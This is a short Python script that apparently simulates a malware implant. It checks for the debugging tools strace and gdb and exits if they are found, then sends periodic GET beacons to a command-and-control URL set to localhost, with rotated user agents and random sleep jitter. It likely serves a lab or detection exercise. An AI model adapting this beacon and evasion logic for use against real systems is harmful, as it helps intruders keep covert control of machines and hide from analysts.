#!/usr/bin/env python3

import requests
import random
import time
import os
from datetime import datetime

C2_URL = "http://localhost:8080"

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.68.0"
]

def anti_analysis_checks():
    suspicious_files = ["/usr/bin/strace", "/usr/bin/gdb"]
    for file in suspicious_files:
        if os.path.exists(file):
            print("[!] Analysis tool detected. Exiting.")
            exit(1)

def beacon():
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        response = requests.get(C2_URL, headers=headers, timeout=5)
        print(f"[{datetime.utcnow()}] Beacon sent. Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Connection failed: {e}")

if __name__ == "__main__":
    anti_analysis_checks()

    while True:
        beacon()
        sleep_time = random.randint(5, 15)
        time.sleep(sleep_time)
